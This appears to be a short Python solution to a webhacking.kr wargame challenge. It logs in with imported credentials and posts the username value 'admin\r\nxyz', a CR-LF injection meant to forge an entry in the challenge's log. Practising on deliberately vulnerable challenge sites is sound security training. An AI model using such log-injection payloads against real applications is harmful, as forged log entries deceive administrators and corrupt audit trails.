import requests
from login import *

s = requests.Session()

# Login webhacking.kr
s.post("https://webhacking.kr/login.php?login", data={"id":webhacking_id, "pw":webhacking_pw})
# log injection with CR-LF
r2 = s.post("https://webhacking.kr/challenge/bonus-9/index.php", data={"id":"admin\r\nxyz"})
s.close()